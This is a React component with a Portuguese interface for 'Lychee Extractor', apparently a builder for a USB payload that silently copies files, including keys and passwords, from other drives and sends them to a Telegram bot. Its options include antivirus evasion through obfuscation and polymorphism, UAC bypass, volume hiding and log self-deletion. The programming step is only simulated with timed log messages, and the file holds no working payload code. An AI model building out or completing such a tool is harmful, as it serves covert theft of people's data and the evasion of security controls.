import React, { useState, useEffect } from 'react';
import { 
  Settings, 
  Send, 
  Usb, 
  ShieldAlert, 
  FileText, 
  Bot, 
  CheckCircle2, 
  AlertCircle, 
  HardDrive, 
  Cpu, 
  Lock,
  ChevronRight,
  Activity
} from 'lucide-react';

const LycheeDataExtractor = () => {
  const [activeTab, setActiveTab] = useState('config');
  const [botToken, setBotToken] = useState('');
  const [chatId, setChatId] = useState('');
  const [targetExtension, setTargetExtension] = useState('all');
  const [isProgramming, setIsProgramming] = useState(false);
  const [status, setStatus] = useState('idle'); // idle, programming, success, error
  const [logs, setLogs] = useState([
    { time: '10:00:01', msg: 'Sistema Lychee inicializado.', type: 'info' },
    { time: '10:00:02', msg: 'Aguardando configuração de destino...', type: 'warn' },
  ]);

  const addLog = (msg, type = 'info') => {
    const time = new Date().toLocaleTimeString();
    setLogs(prev => [{ time, msg, type }, ...prev].slice(0, 50));
  };

  const handleProgram = () => {
    if (!botToken || !chatId) {
      setStatus('error');
      addLog('Erro: Token do Bot ou Chat ID ausentes.', 'error');
      return;
    }

    setIsProgramming(true);
    setStatus('programming');
    addLog('Iniciando gravação do payload no drive...', 'info');

    // Simulação de processo de programação
    setTimeout(() => {
      addLog('Injetando script de monitoramento de montagem (USB-Watch)...', 'info');
      setTimeout(() => {
        addLog('Configurando trigger de cópia recursiva silenciosa...', 'info');
        setTimeout(() => {
          addLog('Ocultando arquivos de sistema e logs no drive...', 'info');
          setTimeout(() => {
            setIsProgramming(false);
            setStatus('success');
            addLog('Pendrive programado com sucesso. Pronto para extração.', 'success');
          }, 1500);
        }, 1500);
      }, 1500);
    }, 1500);
  };

  // Paleta Lychee: Branco Perolado, Vermelho Casca, Rosa Polpa, Verde Folha
  const colors = {
    canvas: 'bg-[#FFF9F9]',
    surface: 'bg-white',
    accent: 'text-[#D6336C]', // Vermelho Lichia
    accentBg: 'bg-[#D6336C]',
    accentHover: 'hover:bg-[#B52A5B]',
    border: 'border-[#FADADD]',
    textMuted: 'text-[#A08080]',
    leaf: 'text-[#7FB069]',
  };

  return (
    <div className={`min-h-screen ${colors.canvas} p-8 font-sans text-slate-800`}>
      <div className="max-w-5xl mx-auto">
        
        {/* Header */}
        <header className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-3">
            <div className={`p-3 rounded-2xl ${colors.accentBg} text-white shadow-lg shadow-pink-200`}>
              <Usb size={28} />
            </div>
            <div>
              <h1 className={`text-2xl font-bold ${colors.accent}`}>Lychee Extractor</h1>
              <p className={`text-sm ${colors.textMuted}`}>Configurador de Payload de Extração Silenciosa</p>
            </div>
          </div>
          <div className="flex items-center gap-2 px-4 py-2 rounded-full bg-white border border-pink-100 text-xs font-medium text-pink-500 shadow-sm">
            <Activity size={14} />
            <span>Kernel: v2.4.1-Lichia</span>
          </div>
        </header>

        <div className="grid grid-cols-12 gap-6">
          
          {/* Sidebar Navigation */}
          <nav className="col-span-3 flex flex-col gap-2">
            {[
              { id: 'config', label: 'Configuração', icon: Settings },
              { id: 'telegram', label: 'Integração Bot', icon: Bot },
              { id: 'payload', label: 'Payload & Stealth', icon: Lock },
              { id: 'logs', label: 'Console de Eventos', icon: FileText },
            ].map(item => (
              <button
                key={item.id}
                onClick={() => setActiveTab(item.id)}
                className={`flex items-center gap-3 px-4 py-3 rounded-xl transition-all duration-200 text-sm font-medium ${
                  activeTab === item.id 
                  ? `${colors.accentBg} text-white shadow-md` 
                  : `bg-white ${colors.textMuted} hover:bg-pink-50 hover:text-pink-600 border ${colors.border}`
                }`}
              >
                <item.icon size={18} />
                {item.label}
              </button>
            ))}
          </nav>

          {/* Main Content Area */}
          <main className="col-span-9">
            <div className={`rounded-3xl ${colors.surface} border ${colors.border} shadow-xl overflow-hidden`}>
              
              {activeTab === 'config' && (
                <div className="p-8">
                  <div className="flex items-center gap-2 mb-6">
                    <Settings className={colors.accent} size={24} />
                    <h2 className="text-xl font-semibold">Parâmetros de Extração</h2>
                  </div>

                  <div className="grid grid-cols-2 gap-6 mb-8">
                    <div className="space-y-2">
                      <label className="text-xs font-bold uppercase tracking-wider text-slate-400">Modo de Captura</label>
                      <select 
                        className="w-full p-3 rounded-lg border border-slate-200 bg-slate-50 focus:ring-2 focus:ring-pink-400 outline-none transition-all"
                        value={targetExtension}
                        onChange={(e) => setTargetExtension(e.target.value)}
                      >
                        <option value="all">Tudo (Recursivo Total)</option>
                        <option value="docs">Documentos (.pdf, .docx, .txt)</option>
                        <option value="media">Mídia (.jpg, .png, .mp4)</option>
                        <option value="keys">Chaves e Senhas (.key, .config)</option>
                      </select>
                    </div>
                    <div className="space-y-2">
                      <label className="text-xs font-bold uppercase tracking-wider text-slate-400">Prioridade de Upload</label>
                      <select className="w-full p-3 rounded-lg border border-slate-200 bg-slate-50 focus:ring-2 focus:ring-pink-400 outline-none transition-all">
                        <option>Imediato (Streaming)</option>
                        <option>Lote (Batch Upload)</option>
                        <option>Oculto (Low Bandwidth)</option>
                      </select>
                    </div>
                  </div>

                  <div className={`p-4 rounded-2xl border-l-4 ${status === 'success' ? 'bg-green-50 border-green-500' : 'bg-amber-50 border-amber-500'} mb-8`}>
                    <div className="flex gap-3">
                      {status === 'success' ? <CheckCircle2 className="text-green-600" /> : <AlertCircle className="text-amber-600" />}
                      <p className="text-sm text-slate-600">
                        {status === 'success' 
                          ? 'O payload foi injetado. O pendrive agora monitora a inserção de outros drives e envia os dados via Telegram.' 
                          : 'O pendrive ainda não foi programado. Configure o Bot e clique em "Programar Drive".'}
                      </p>
                    </div>
                  </div>

                  <button 
                    onClick={handleProgram}
                    disabled={isProgramming}
                    className={`w-full py-4 rounded-2xl font-bold text-white transition-all flex items-center justify-center gap-3 shadow-lg ${
                      isProgramming ? 'bg-slate-400 cursor-not-allowed' : `${colors.accentBg} ${colors.accentHover}`
                    }`}
                  >
                    {isProgramming ? (
                      <>
                        <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                        Programando Drive...
                      </>
                    ) : (
                      <>
                        <Cpu size={20} />
                        Programar Pendrive Agora
                      </>
                    )}
                  </button>
                </div>
              )}

              {activeTab === 'telegram' && (
                <div className="p-8">
                  <div className="flex items-center gap-2 mb-6">
                    <Bot className={colors.accent} size={24} />
                    <h2 className="text-xl font-semibold">Destino: Telegram Bot</h2>
                  </div>
                  
                  <div className="space-y-6 max-w-md">
                    <div className="space-y-2">
                      <label className="text-xs font-bold uppercase tracking-wider text-slate-400">HTTP API Token</label>
                      <div className="relative">
                        <input 
                          type="password" 
                          placeholder="123456789:ABCdefGhI..." 
                          className="w-full p-3 pl-10 rounded-lg border border-slate-200 bg-slate-50 focus:ring-2 focus:ring-pink-400 outline-none transition-all"
                          value={botToken}
                          onChange={(e) => setBotToken(e.target.value)}
                        />
                        <Send className="absolute left-3 top-3.5 text-slate-400" size={16} />
                      </div>
                    </div>

                    <div className="space-y-2">
                      <label className="text-xs font-bold uppercase tracking-wider text-slate-400">Chat ID (Destinatário)</label>
                      <div className="relative">
                        <input 
                          type="text" 
                          placeholder="987654321" 
                          className="w-full p-3 pl-10 rounded-lg border border-slate-200 bg-slate-50 focus:ring-2 focus:ring-pink-400 outline-none transition-all"
                          value={chatId}
                          onChange={(e) => setChatId(e.target.value)}
                        />
                        <Bot className="absolute left-3 top-3.5 text-slate-400" size={16} />
                      </div>
                    </div>

                    <div className="p-4 rounded-xl bg-pink-50 border border-pink-100 text-xs text-pink-700 leading-relaxed">
                      <strong>Dica:</strong> Use o @userinfobot no Telegram para descobrir seu Chat ID numérico. O token é obtido via @BotFather.
                    </div>
                  </div>
                </div>
              )}

              {activeTab === 'payload' && (
                <div className="p-8">
                  <div className="flex items-center gap-2 mb-6">
                    <Lock className={colors.accent} size={24} />
                    <h2 className="text-xl font-semibold">Stealth & Evasão</h2>
                  </div>
                  
                  <div className="grid grid-cols-1 gap-4">
                    {[
                      { title: 'Ocultar Volume', desc: 'Remove a letra da unidade do explorador de arquivos.', active: true },
                      { title: 'Anti-Antivírus', desc: 'Ofuscação de strings e polimorfismo de payload.', active: true },
                      { title: 'Auto-Destruição', desc: 'Apaga logs de cópia após o upload bem sucedido.', active: false },
                      { title: 'Bypass UAC', desc: 'Tenta elevar privilégios para acessar pastas de sistema.', active: true },
                    ].map((feat, i) => (
                      <div key={i} className="flex items-center justify-between p-4 rounded-xl border border-slate-100 bg-slate-50 hover:bg-white transition-colors group">
                        <div className="flex items-center gap-3">
                          <ShieldAlert className="text-slate-400 group-hover:text-pink-500 transition-colors" size={20} />
                          <div>
                            <p className="text-sm font-medium">{feat.title}</p>
                            <p className="text-xs text-slate-500">{feat.desc}</p>
                          </div>
                        </div>
                        <div className={`w-10 h-5 rounded-full relative cursor-pointer transition-colors ${feat.active ? 'bg-pink-500' : 'bg-slate-300'}`}>
                          <div className={`absolute top-1 w-3 h-3 bg-white rounded-full transition-all ${feat.active ? 'right-1' : 'left-1'}`} />
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {activeTab === 'logs' && (
                <div className="p-8">
                  <div className="flex items-center justify-between mb-6">
                    <div className="flex items-center gap-2">
                      <FileText className={colors.accent} size={24} />
                      <h2 className="text-xl font-semibold">Console de Eventos</h2>
                    </div>
                    <button 
                      onClick={() => setLogs([{ time: 'Now', msg: 'Logs limpos.', type: 'info' }])}
                      className="text-xs font-medium text-slate-400 hover:text-pink-500 transition-colors"
                    >
                      Limpar Console
                    </button>
                  </div>

                  <div className="bg-slate-900 rounded-2xl p-6 font-mono text-xs h-[400px] overflow-y-auto shadow-inner">
                    {logs.map((log, i) => (
                      <div key={i} className="flex gap-4 mb-2 animate-in fade-in slide-in-from-left-2 duration-300">
                        <span className="text-slate-500">[{log.time}]</span>
                        <span className={`
                          ${log.type === 'error' ? 'text-red-400' : ''}
                          ${log.type === 'success' ? 'text-green-400' : ''}
                          ${log.type === 'warn' ? 'text-amber-400' : ''}
                          ${log.type === 'info' ? 'text-blue-300' : ''}
                        `}>
                          {log.msg}
                        </span>
                      </div>
                    ))}
                  </div>
                </div>
              )}

            </div>
          </main>
        </div>

        {/* Footer Status Bar */}
        <footer className="mt-8 flex items-center justify-between px-6 py-3 rounded-2xl bg-white border border-pink-100 text-[10px] uppercase tracking-widest font-bold text-slate-400">
          <div className="flex items-center gap-4">
            <span className="flex items-center gap-1"><HardDrive size={12} /> Drive: <span className="text-pink-500">Detectado (E:)</span></span>
            <span className="flex items-center gap-1"><Bot size={12} /> Bot: <span className={botToken ? 'text-green-500' : 'text-red-500'}>{botToken ? 'Conectado' : 'Desconectado'}</span></span>
          </div>
          <div className="flex items-center gap-2">
            <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
            SISTEMA OPERACIONAL ATIVO
          </div>
        </footer>
      </div>
    </div>
  );
};

export default LycheeDataExtractor;